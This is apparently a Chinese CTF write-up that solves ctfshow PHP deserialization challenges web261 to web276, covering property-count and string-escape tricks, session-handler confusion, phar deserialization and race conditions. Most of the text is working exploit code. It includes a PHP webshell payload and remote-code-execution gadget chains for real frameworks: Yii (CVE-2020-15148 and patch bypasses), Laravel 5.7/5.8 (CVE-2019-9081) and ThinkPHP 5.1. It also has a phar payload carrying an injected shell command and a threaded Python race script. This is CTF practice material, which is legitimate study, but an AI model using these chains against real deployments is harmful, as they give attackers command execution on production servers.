&lt; 7.0.10 漏洞原理 当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 __wakeup 函数的执行。 但是题目是 PHP 7.4.2 明显不满足要求， 然后guguru了一下比较显眼的 __unserialize 魔术方法，因为没见过 https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize 发现有趣的东西，官方文档是这样介绍的 就当同时存在 __wakeup 和 __unserialize 魔术方法时，只会调用 __unserialize 魔术方法。 仔细观察析构方法，是个弱比较 $this-&gt;code==0x36d 然后 0x36d 的十进制是 877 ，写个小实验 也就是说弱比较 $code 变量前面是 877 就好了，不管后面加了啥字符串，就可以让 $code == 0x36d 成立了。 构造 POC 1234567&lt;?phpclass ctfshowvip&#123; public $username = &quot;877.php&quot;; public $password = &#x27;&lt;?php eval($_GET[c]); ?&gt;&#x27;;&#125;echo urlencode(serialize(new ctfshowvip())); 会生成 877.php 然后 cat /flag_is_here 即可 题外 因为 PHP 底层是用 C语言写的，原本想着用 \\0 作为字符串截断，这样不会拼接 $passwod 字段，然后发现，如果第一个参数有 \\0 ， file_put_contents 会报错。 然后 __invoke 和 __sleep 在这里的用处不太清楚。。 web262 字符逃逸PHP/5.6.40 字符逃逸 index.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 02:37:19# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 16:05:38# @message.php# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;$f = $_GET[&#x27;f&#x27;];$m = $_GET[&#x27;m&#x27;];$t = $_GET[&#x27;t&#x27;];if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123; $msg = new message($f,$m,$t); $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg)); setcookie(&#x27;msg&#x27;,base64_encode($umsg)); echo &#x27;Your message has been sent&#x27;;&#125;highlight_file(__FILE__); 看注释发现 message.php 123456789101112131415161718192021222324252627282930313233&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 15:13:03# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123; $msg = unserialize(base64_decode($_COOKIE[&#x27;msg&#x27;])); if($msg-&gt;token==&#x27;admin&#x27;)&#123; echo $flag; &#125;&#125; 第一种做法poc 1234567891011&lt;?phpclass message&#123; public $token=&#x27;admin&#x27;;&#125;$msg = new message();echo(base64_encode(serialize($msg)));?&gt; 第二种做法因有一个正则替换，注意是序列化后再替换，且替换每次内容长度增加1，假如输入 t=fuck&quot; 我们输入的 &quot; 刚刚好可以发前面闭合，也就是说，我们每输入一个 fuck，我们可控的内容就多出 1 个字符。 我们目的构造 $token=&quot;admin&quot; 序列化长这样 即 s:5:&quot;token&quot;;s:5:&quot;admin&quot;; 加上闭合 1&quot;;&#96;&#96;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#96;&#96;&#125; 长度为 27 也就是我们需要输入 27 个 fuck poc 1/?f=6&amp;m=6&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125; web263 session伪造PHP/7.3.11 session伪造 📎www.zip 通过 /www.zip 扫描到源码，这里目录扫描全是 200，建议使用可以看到返回包大小的扫描器，或者有 404 页面识别的扫描器，比如 dirmap 日常吐槽 fortify，咋啥也扫不出来 (x seay 发现 file_put_contents 输入可控 利用前提： 利用点是 session.serialize_handler 与 php.ini 的配置不同引起的反序列化，至于为什么不同，如果相同的也就没必要加上这句设置了（ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);），毕竟是默认配置对吧 目标： file_put_contents 可控点在 inc/inc.php 在 User 类，可以通过反序列化触发 __destruct 思路： 首先访问两次首页，抓包可以看到Cookie limit 参数，构造 exp ，使得我们的反序列化数据写入 session 文件（通过 $_SESSION[&#39;limit&#39;]=base64_decode($_COOKIE[&#39;limit&#39;]); 写入，这是PHP session 机制，可参考 此链接） 因 inc/inc.php 存在 ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); 和 session_start(); ，只要访问即会获取之前写入的 session 数据，然后 check.php 包含 inc/inc.php ，即会触发 User类 的 __destruct方法 ，从而把恶意数据通过 file_put_contents 写入名为 log-$this.username ，内容为 $this.password 的文件。 poc 123456789101112&lt;?phpclass User&#123; public $username = &#x27;tari.php&#x27;; public $password = &#x27;&lt;?php system(&quot;cat flag.php&quot;) ?&gt;&#x27;;&#125;$user = new User();echo(base64_encode(&#x27;|&#x27;.serialize($user)));?&gt; 这里加 &#39;|&#39; 是因为 session.serialize_handler 使用 php引擎 ，session 关联数组的 key 和 value 是通过 &#39;|&#39; 区分的， value 是需要被反序列化的部分。然后默认不是用 php 引擎，所以…. 所以写入是正常字符串，在 inc/inc.php 这读取语义又不一样了。 随便请求一下 check.php 注意是 log-tari.php ! web264 字符逃逸PHP/5.6.40 字符逃逸 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 02:37:19# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 16:05:38# @message.php# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);session_start();class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;$f = $_GET[&#x27;f&#x27;];$m = $_GET[&#x27;m&#x27;];$t = $_GET[&#x27;t&#x27;];if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123; $msg = new message($f,$m,$t); $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg)); $_SESSION[&#x27;msg&#x27;]=base64_encode($umsg); echo &#x27;Your message has been sent&#x27;;&#125;highlight_file(__FILE__); 看注释发现 message.php 12345678910111213141516171819202122232425262728293031323334&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 15:13:03# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/session_start();highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123; $msg = unserialize(base64_decode($_SESSION[&#x27;msg&#x27;])); if($msg-&gt;token==&#x27;admin&#x27;)&#123; echo $flag; &#125;&#125; 看注释发现 message.php 12345678910111213141516171819202122232425262728293031323334&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 15:13:03# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/session_start();highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123; $msg = unserialize(base64_decode($_SESSION[&#x27;msg&#x27;])); if($msg-&gt;token==&#x27;admin&#x27;)&#123; echo $flag; &#125;&#125; 一开始没看出和 web262 有啥区别，仔细看了一下发现，反序列化时使用了 session 而不是直接通过 Cookie 接收 做法和 web262中第二种做法一样，虽然不是通过 Cookie 接收，也别忘了了 Cookie 的 msg 字段附加个值，不然不满足 1if(isset($_COOKIE[&#x27;msg&#x27;]))&#123; 先请求 index.php （这里 poc 不明白怎么构造看一下 web262 第二种做法） 因为 PHP 的 session 是通过 Cookie 里的 PHPSESSID 获取的（不清除参考 web263 session 伪造），所以要记录下来，然后在 message.php 里带上。 然后请求一下 message.php , 别忘了 Cookie 部分 web265 变量引用PHP/5.6.40 变量引用 1234567891011121314151617181920212223242526272829303132333435&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-04 23:52:24# @Last Modified by: h1xa# @Last Modified time: 2020-12-05 00:17:08# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);include(&#x27;flag.php&#x27;);highlight_file(__FILE__);class ctfshowAdmin&#123; public $token; public $password; public function __construct($t,$p)&#123; $this-&gt;token=$t; $this-&gt;password = $p; &#125; public function login()&#123; return $this-&gt;token===$this-&gt;password; &#125;&#125;$ctfshow = unserialize($_GET[&#x27;ctfshow&#x27;]);$ctfshow-&gt;token=md5(mt_rand());if($ctfshow-&gt;login())&#123; echo $flag;&#125; token 会变，让 password 成为 token 的引用就好了 poc 12345678910111213&lt;?phpclass ctfshowAdmin&#123; public $token; public $password;&#125;$admin = new ctfshowAdmin();$admin-&gt;password = &amp;$admin-&gt;token;echo(urlencode(serialize($admin)));?&gt; web266 类和方法不区分大小写PHP/7.3.11 PHP特性 类和方法不区分大小写 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-04 23:52:24# @Last Modified by: h1xa# @Last Modified time: 2020-12-05 00:17:08# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);include(&#x27;flag.php&#x27;);$cs = file_get_contents(&#x27;php://input&#x27;);class ctfshow&#123; public $username=&#x27;xxxxxx&#x27;; public $password=&#x27;xxxxxx&#x27;; public function __construct($u,$p)&#123; $this-&gt;username=$u; $this-&gt;password=$p; &#125; public function login()&#123; return $this-&gt;username===$this-&gt;password; &#125; public function __toString()&#123; return $this-&gt;username; &#125; public function __destruct()&#123; global $flag; echo $flag; &#125;&#125;$ctfshowo=@unserialize($cs);if(preg_match(&#x27;/ctfshow/&#x27;, $cs))&#123; throw new Exception(&quot;Error $ctfshowo&quot;,1);&#125; 拦截点：序列化数据不能包括 ctfshow， PHP特性：函数名和类名不区分大小写，变量名区分，例如 poc 12345678910&lt;?phpclass Ctfshow&#123;&#125;$user = new Ctfshow();echo(serialize($user));?&gt; web267 Yii 框架 CVEPHP/7.3.11 框架审计 CVE-2020-15148 Yii登录前 弱密码 admin/admin 登录 about 页面有个 &lt;!--?view-source --&gt; 提示 可以通过 index.php?r=site%2Fabout&amp;view-source 查看提示 这是 Yii 的路由规则，传送门 ，咋知道的 Yii？通过 burp 抓包记录看到很多 yii.js php 搜了下 （ 框架反序列化漏洞，网上应该可以搜到，一个不错的复现和挖掘文章，传送门 有空会（咕咕预订…）额外写文章复现 （ poc 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;exec&#x27;; $this-&gt;id = &#x27;cp /fla* tari.txt&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters[&#x27;close&#x27;] = [new CreateAction, &#x27;run&#x27;]; &#125; &#125;&#125;namespace yii\\db&#123; use Faker\\Generator; class BatchQueryResult&#123; private $_dataReader; public function __construct()&#123; $this-&gt;_dataReader = new Generator; &#125; &#125;&#125;namespace&#123; echo base64_encode(serialize(new yii\\db\\BatchQueryResult));&#125; web268 Yii 框架 CVE 补丁绕过 1PHP/7.3.11 框架审计 CVE-2020-15148 Yii登录前 补丁绕过 思路类似 web267，估计是打过补丁版本 有空会（咕咕预订…）额外写文章复现 （ poc1 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;exec&#x27;; $this-&gt;id = &#x27;cp /fla* tari.txt&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; // 这里需要改为isRunning $this-&gt;formatters[&#x27;isRunning&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;// poc1namespace Codeception\\Extension&#123; use Faker\\Generator; class RunProcess&#123; private $processes; public function __construct() &#123; $this-&gt;processes = [new Generator()]; &#125; &#125;&#125;namespace&#123; echo base64_encode(serialize(new Codeception\\Extension\\RunProcess()));&#125;?&gt; web269 Yii 框架 CVE 补丁绕过 2PHP/7.3.11 框架审计 CVE-2020-15148 Yii登录前 补丁绕过 思路类似 web267，估计是打过补丁版本 有空会（咕咕预订…）额外写文章复现 （ poc2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;exec&#x27;; $this-&gt;id = &#x27;cp /fla* tari.txt&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters[&#x27;render&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;namespace phpDocumentor\\Reflection\\DocBlock\\Tags&#123; use Faker\\Generator; class See&#123; protected $description; public function __construct() &#123; $this-&gt;description = new Generator(); &#125; &#125;&#125;namespace&#123; use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class Swift_KeyCache_DiskKeyCache&#123; private $keys = []; private $path; public function __construct() &#123; $this-&gt;path = new See; $this-&gt;keys = array( // 有就行 &quot;suiyi&quot;=&gt;array(&quot;suiyi&quot;=&gt;&quot;suiyi&quot;) ); &#125; &#125; echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));&#125;?&gt; web270 Yii 框架 CVE 补丁绕过 3PHP/7.3.11 框架审计 CVE-2020-15148 Yii登录前 补丁绕过 思路类似 web267，估计是打过补丁版本 有空会（咕咕预订…）额外写文章复现 （ poc3 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpnamespace yii\\rest &#123; class Action &#123; public $checkAccess; &#125; class IndexAction &#123; public function __construct($func, $param) &#123; $this-&gt;checkAccess = $func; $this-&gt;id = $param; &#125; &#125;&#125;namespace yii\\web &#123; abstract class MultiFieldSession &#123; public $writeCallback; &#125; class DbSession extends MultiFieldSession &#123; public function __construct($func, $param) &#123; $this-&gt;writeCallback = [new \\yii\\rest\\IndexAction($func, $param), &quot;run&quot;]; &#125; &#125;&#125;namespace yii\\db &#123; use yii\\base\\BaseObject; class BatchQueryResult &#123; private $_dataReader; public function __construct($func, $param) &#123; $this-&gt;_dataReader = new \\yii\\web\\DbSession($func, $param); &#125; &#125;&#125;namespace &#123; $exp = new \\yii\\db\\BatchQueryResult(&#x27;exec&#x27;, &#x27;cp /fla* tari.txt&#x27;); echo(base64_encode(serialize($exp)));&#125; web271 Laravel 5.7 框架 CVEPHP/7.1.26 框架审计 CVE-2019-9081 Laravel 5.7登录前 源码 可参考文章 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php/** * Laravel - A PHP Framework For Web Artisans * * @package Laravel * @author Taylor Otwell &lt;taylor@laravel.com&gt; */define(&#x27;LARAVEL_START&#x27;, microtime(true));/*|--------------------------------------------------------------------------| Register The Auto Loader|--------------------------------------------------------------------------|| Composer provides a convenient, automatically generated class loader for| our application. We just need to utilize it! We&#x27;ll simply require it| into the script here so that we don&#x27;t have to worry about manual| loading any of our classes later on. It feels great to relax.|*/require __DIR__ . &#x27;/../vendor/autoload.php&#x27;;/*|--------------------------------------------------------------------------| Turn On The Lights|--------------------------------------------------------------------------|| We need to illuminate PHP development, so let us turn on the lights.| This bootstraps the framework and gets it ready for use, then it| will load up this application so that we can run it and send| the responses back to the browser and delight our users.|*/$app = require_once __DIR__ . &#x27;/../bootstrap/app.php&#x27;;/*|--------------------------------------------------------------------------| Run The Application|--------------------------------------------------------------------------|| Once we have the application, we can handle the incoming request| through the kernel, and send the associated response back to| the client&#x27;s browser allowing them to enjoy the creative| and wonderful application we have prepared for them.|*/$kernel = $app-&gt;make(Illuminate\\Contracts\\Http\\Kernel::class);$response = $kernel-&gt;handle( $request = Illuminate\\Http\\Request::capture());@unserialize($_POST[&#x27;data&#x27;]);highlight_file(__FILE__);$kernel-&gt;terminate($request, $response); poc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpnamespace Illuminate\\Foundation\\Testing &#123; class PendingCommand &#123; public $test; protected $app; protected $command; protected $parameters; public function __construct($test, $app, $command, $parameters) &#123; $this-&gt;test = $test; //一个实例化的类 Illuminate\\Auth\\GenericUser $this-&gt;app = $app; //一个实例化的类 Illuminate\\Foundation\\Application $this-&gt;command = $command; //要执行的php函数 system $this-&gt;parameters = $parameters; //要执行的php函数的参数 array(&#x27;id&#x27;) &#125; &#125;&#125;namespace Faker &#123; class DefaultGenerator &#123; protected $default; public function __construct($default = null) &#123; $this-&gt;default = $default; &#125; &#125;&#125;namespace Illuminate\\Foundation &#123; class Application &#123; protected $instances = []; public function __construct($instances = []) &#123; $this-&gt;instances[&#x27;Illuminate\\Contracts\\Console\\Kernel&#x27;] = $instances; &#125; &#125;&#125;namespace &#123; $defaultgenerator = new Faker\\DefaultGenerator(array(&quot;hello&quot; =&gt; &quot;world&quot;)); $app = new Illuminate\\Foundation\\Application(); $application = new Illuminate\\Foundation\\Application($app); $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand($defaultgenerator, $application, &#x27;system&#x27;, array(&#x27;cat /flag&#x27;)); echo urlencode(serialize($pendingcommand));&#125; 因代码里是通过 POST 的 data 接收，所以这里是用 data POST 过去 web272 Laravel 5.8 框架 CVEPHP/7.1.26 框架审计 Laravel 5.8登录前 可参考文章 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php/** * Laravel - A PHP Framework For Web Artisans * * @package Laravel * @author Taylor Otwell &lt;taylor@laravel.com&gt; */define(&#x27;LARAVEL_START&#x27;, microtime(true));/*|--------------------------------------------------------------------------| Register The Auto Loader|--------------------------------------------------------------------------|| Composer provides a convenient, automatically generated class loader for| our application. We just need to utilize it! We&#x27;ll simply require it| into the script here so that we don&#x27;t have to worry about manual| loading any of our classes later on. It feels great to relax.|*/require __DIR__ . &#x27;/../vendor/autoload.php&#x27;;/*|--------------------------------------------------------------------------| Turn On The Lights|--------------------------------------------------------------------------|| We need to illuminate PHP development, so let us turn on the lights.| This bootstraps the framework and gets it ready for use, then it| will load up this application so that we can run it and send| the responses back to the browser and delight our users.|*/$app = require_once __DIR__ . &#x27;/../bootstrap/app.php&#x27;;/*|--------------------------------------------------------------------------| Run The Application|--------------------------------------------------------------------------|| Once we have the application, we can handle the incoming request| through the kernel, and send the associated response back to| the client&#x27;s browser allowing them to enjoy the creative| and wonderful application we have prepared for them.|*/$kernel = $app-&gt;make(Illuminate\\Contracts\\Http\\Kernel::class);$response = $kernel-&gt;handle( $request = Illuminate\\Http\\Request::capture());@unserialize($_POST[&#x27;data&#x27;]);highlight_file(__FILE__);$kernel-&gt;terminate($request, $response); 有空会（咕咕预订…）额外写文章复现 （ poc 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpnamespace PhpParser\\Node\\Scalar\\MagicConst&#123; class Line &#123;&#125;&#125;namespace Mockery\\Generator&#123; class MockDefinition &#123; protected $config; protected $code; public function __construct($config, $code) &#123; $this-&gt;config = $config; $this-&gt;code = $code; &#125; &#125;&#125;namespace Mockery\\Loader&#123; class EvalLoader&#123;&#125;&#125;namespace Illuminate\\Bus&#123; class Dispatcher &#123; protected $queueResolver; public function __construct($queueResolver) &#123; $this-&gt;queueResolver = $queueResolver; &#125; &#125;&#125;namespace Illuminate\\Foundation\\Console&#123; class QueuedCommand &#123; public $connection; public function __construct($connection) &#123; $this-&gt;connection = $connection; &#125; &#125;&#125;namespace Illuminate\\Broadcasting&#123; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($events, $event) &#123; $this-&gt;events = $events; $this-&gt;event = $event; &#125; &#125;&#125;namespace&#123; $line = new PhpParser\\Node\\Scalar\\MagicConst\\Line(); $mockdefinition = new Mockery\\Generator\\MockDefinition($line,&quot;&lt;?php system(&#x27;cat /f*&#x27;);exit;?&gt;&quot;); $evalloader = new Mockery\\Loader\\EvalLoader(); $dispatcher = new Illuminate\\Bus\\Dispatcher(array($evalloader,&#x27;load&#x27;)); $queuedcommand = new Illuminate\\Foundation\\Console\\QueuedCommand($mockdefinition); $pendingbroadcast = new Illuminate\\Broadcasting\\PendingBroadcast($dispatcher,$queuedcommand); echo urlencode(serialize($pendingbroadcast));&#125;?&gt; 其实还有挺多链的 https://www.anquanke.com/post/id/189718 web273 和web273一样PHP/7.1.32框架审计Laravel 5.8登录前 PHP/7.1.32 框架审计 Laravel 5.8登录前 emm，说实话除了PHP版本细微差别，还不知道有啥区别，竟然 poc 一毛一样 有空会（咕咕预订…）额外写文章复现 （ web274 thinkphp5.1nginx/1.16.1 PHP/7.3.11 框架审计 thinkphp5.1 thinkphp 5.1反序列化漏洞 参考文章：https://xz.aliyun.com/t/6619 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpnamespace think;abstract class Model&#123; protected $append = []; private $data = []; function __construct()&#123; $this-&gt;append = [&quot;lin&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]]; $this-&gt;data = [&quot;lin&quot;=&gt;new Request()]; &#125;&#125;class Request&#123; protected $hook = []; protected $filter = &quot;system&quot;; protected $config = [ // 表单ajax伪装变量 &#x27;var_ajax&#x27; =&gt; &#x27;_ajax&#x27;, ]; function __construct()&#123; $this-&gt;filter = &quot;system&quot;; $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;lin&#x27;]; $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]]; &#125;&#125;namespace think\\process\\pipes;use think\\model\\concern\\Conversion;use think\\model\\Pivot;class Windows&#123; private $files = []; public function __construct() &#123; $this-&gt;files=[new Pivot()]; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;use think\\process\\pipes\\Windows;echo base64_encode(serialize(new Windows()));?&gt; 数据接收方式 有空会（咕咕预订…）额外写文章复现 （ poc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpnamespace think;abstract class Model&#123; protected $append = []; private $data = []; function __construct()&#123; $this-&gt;append = [&quot;lin&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]]; $this-&gt;data = [&quot;lin&quot;=&gt;new Request()]; &#125;&#125;class Request&#123; protected $hook = []; protected $filter = &quot;system&quot;; protected $config = [ // 表单ajax伪装变量 &#x27;var_ajax&#x27; =&gt; &#x27;_ajax&#x27;, ]; function __construct()&#123; $this-&gt;filter = &quot;system&quot;; $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;lin&#x27;]; $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]]; &#125;&#125;namespace think\\process\\pipes;use think\\model\\concern\\Conversion;use think\\model\\Pivot;class Windows&#123; private $files = []; public function __construct() &#123; $this-&gt;files=[new Pivot()]; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;use think\\process\\pipes\\Windows;echo base64_encode(serialize(new Windows()));?&gt; web275 命令执行拼接PHP/7.3.11 nginx/1.16.1 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-08 19:13:36# @Last Modified by: h1xa# @Last Modified time: 2020-12-08 20:08:07# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);class filter&#123; public $filename; public $filecontent; public $evilfile=false; public function __construct($f,$fn)&#123; $this-&gt;filename=$f; $this-&gt;filecontent=$fn; &#125; public function checkevil()&#123; if(preg_match(&#x27;/php|\\.\\./i&#x27;, $this-&gt;filename))&#123; $this-&gt;evilfile=true; &#125; if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123; $this-&gt;evilfile=true; &#125; return $this-&gt;evilfile; &#125; public function __destruct()&#123; if($this-&gt;evilfile)&#123; system(&#x27;rm &#x27;.$this-&gt;filename); &#125; &#125;&#125;if(isset($_GET[&#x27;fn&#x27;]))&#123; $content = file_get_contents(&#x27;php://input&#x27;); $f = new filter($_GET[&#x27;fn&#x27;],$content); if($f-&gt;checkevil()===false)&#123; file_put_contents($_GET[&#x27;fn&#x27;], $content); copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;); unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]); echo &#x27;work done&#x27;; &#125; &#125;else&#123; echo &#x27;where is flag?&#x27;;&#125;where is flag? 分析： 看似花里胡哨，其实 __destruct 里的 system 可直接拼接，也就是设法让 $this-&gt;evilfile 置为 true ，然后拼接命令即可。 题外：第一眼看去这一读一写，长的这么想被我条件竞争的样子 （ web276 phar反序列化 条件竞争nginx/1.16.1 PHP/7.3.11 phar反序列化 条件竞争 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-08 19:13:36# @Last Modified by: h1xa# @Last Modified time: 2020-12-08 20:08:07# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);class filter&#123; public $filename; public $filecontent; public $evilfile=false; public $admin = false; public function __construct($f,$fn)&#123; $this-&gt;filename=$f; $this-&gt;filecontent=$fn; &#125; public function checkevil()&#123; if(preg_match(&#x27;/php|\\.\\./i&#x27;, $this-&gt;filename))&#123; $this-&gt;evilfile=true; &#125; if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123; $this-&gt;evilfile=true; &#125; return $this-&gt;evilfile; &#125; public function __destruct()&#123; if($this-&gt;evilfile &amp;&amp; $this-&gt;admin)&#123; system(&#x27;rm &#x27;.$this-&gt;filename); &#125; &#125;&#125;if(isset($_GET[&#x27;fn&#x27;]))&#123; $content = file_get_contents(&#x27;php://input&#x27;); $f = new filter($_GET[&#x27;fn&#x27;],$content); if($f-&gt;checkevil()===false)&#123; file_put_contents($_GET[&#x27;fn&#x27;], $content); copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;); unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]); echo &#x27;work done&#x27;; &#125; &#125;else&#123; echo &#x27;where is flag?&#x27;;&#125;where is flag? 分析： emm，在上题基础上新增了个判断 $this-&gt;admin 然后想着，构造一下序列化不就行了嘛，然后发现没有反序列化函数。。 看了下发现可以通过 file_put_contents 写 phar文件，然后题目中 file_put_contents 第一个参数可控，那么我们可以使用 phar:// 协议，通过 $content 传入 phar 数据，这样在 PHP 通过 phar:// 协议解析数据时，会将 meta-data 部分进行反序列化。 不过题目会删除文件，所以需要在删除文件前执行文件进行以上操作，因此要用到条件竞争，即生成了 phar 文件，在极短时间内文件是存在的，因为执行到 unlink 函数前还有一个 copy 文件操作，磁盘 io 是需要一定时间的。只要我们不断在写入 phar 文件，那么这个文件就可以断断续续访问到~ poc phar构造如下，会在当前目录生成 evil.phar 文件 123456789101112131415161718192021222324252627&lt;?phpclass filter &#123; public $filename = &#x27;;cat fl*&#x27;; public $evilfile = true; public $admin = true;&#125;// 后缀必须为phar$phar = new Phar(&quot;evil.phar&quot;);$phar-&gt;startBuffering();// 设置 stubb, 增加 gif 文件头$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new filter();/** * 将自定义的 meta-data 存入 manifest * 这个函数需要在php.ini中修改 phar.readonly 为 Off * 否则的话会抛出 * creating archive &quot;***.phar&quot; disabled by the php.ini setting phar.readonly * 异常. */$phar-&gt;setMetadata($o);// 添加需压缩的文件$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt; 条件竞争，py3脚本 1234567891011121314151617181920212223242526272829import base64import requestsimport threadingflag = Falseurl = &#x27;http://0f5a5b64-ef6b-4317-b093-3f2fc62f1df9.challenge.ctf.show:8080/&#x27;data = open(&#x27;./evil.phar&#x27;, &#x27;rb&#x27;).read()pre_resp = requests.get(url)if pre_resp.status_code != 200: print(url + &#x27;\\n链接好像挂了....&#x27;) exit(1)def upload(): requests.post(url+&quot;?fn=evil.phar&quot;, data=data)def read(): global flag r = requests.post(url+&quot;?fn=phar://evil.phar/&quot;, data=&quot;&quot;) if &quot;ctfshow&#123;&quot; in r.text and flag is False: print(base64.b64encode(r.text.encode())) flag = Truewhile flag is False: a = threading.Thread(target=upload) b = threading.Thread(target=read) a.start() b.start() base64解码一下即可 题外 除了 file_put_contents 外，会把 phar 反序列化的函数还有： 受影响的函数列表 filename filectime (获取文件的inode更改时间) file_exists file_get_contents file_put_contents file filegroup (获取文件的组名) fopen fileinode 